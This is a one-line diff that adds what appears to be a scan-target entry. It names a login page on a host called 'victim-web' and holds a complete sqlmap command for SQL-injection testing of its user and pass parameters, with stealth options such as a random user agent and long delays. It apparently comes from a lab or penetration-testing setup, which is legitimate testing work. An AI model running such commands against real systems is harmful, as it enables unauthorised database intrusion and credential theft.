@@ -1,0 +1,1 @@
+http://victim-web:80/login.php?user=*&pass=* (GET)  # /usr/local/bin/sqlmap -u http://victim-web:80/login.php?user=*&pass=* --batch --random-agent --threads=1 --delay=120 --time-sec=10 --risk=1 --level=1 --output-dir=/opt/output/sqlmap_login
